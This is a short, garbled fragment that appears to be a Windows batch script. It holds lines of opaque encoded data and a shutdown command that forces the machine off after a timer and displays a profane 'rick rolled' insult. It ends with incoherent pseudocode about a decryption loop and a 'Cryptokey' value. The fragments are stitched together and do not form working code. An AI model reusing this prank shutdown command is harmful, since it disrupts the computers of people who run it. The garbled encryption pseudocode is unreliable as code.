...
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFChcTRaNMleeCaIS5Of66/m7kA1VBatxconS3NQ=
...
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFChcTRaNMleeCbYJ5e31+/m7iEgPW+86RLXemoObLuQW+FLlc5AomH9Cnas=
::YB416Ek+ZG8=
::
::
...
shutdown -s -t 213 -c "You've just been RICK ROLLED BITCH CUNT !"
...
Loop:
    ...
    *A = B
    ...
    C = A + B
    A = A + 1
    GOTO Loop IF NOT A = Decryption Code
    C = C^2
    GOTO Encrypted 
Cryptokey
    15_4_1989
